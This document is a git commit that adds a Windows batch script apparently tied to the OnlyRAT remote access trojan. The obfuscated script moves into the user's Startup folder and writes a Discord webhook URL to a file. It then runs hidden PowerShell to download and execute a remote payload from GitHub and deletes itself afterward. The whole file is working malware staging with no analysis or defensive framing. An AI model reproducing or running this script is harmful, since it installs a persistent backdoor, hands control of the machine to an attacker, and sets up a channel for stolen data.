6ed4b6ea27870de9f3b444067dfc16a902f5c736
$./Netrunner_& <114373528+00xNetrunner@users.noreply.github.com>
2023-07-18 23:29:14 +0100

    onlyRat from githubcmd

---
+++ from-github.cmd
@@ -0,0 +1,9 @@
+@echo off
+set "XNjFYKECht=%cd%"
+set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+cd %YKHfpmMRoQ%
+echo https://discord.com/api/webhooks/1130801792293294170/-WbH2xRVbMCMP-7dafq8qwGXbXo7-7wflOxoFSmJR_7oUeG4kNn26KpcIebZWehnpobP > lawFvVTikZ.txt
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/g1.cmd -o wEaoFkNduy.cmd"
+powershell ./wEaoFkNduy.cmd
+cd "%XNjFYKECht%"
+del from-github.cmd
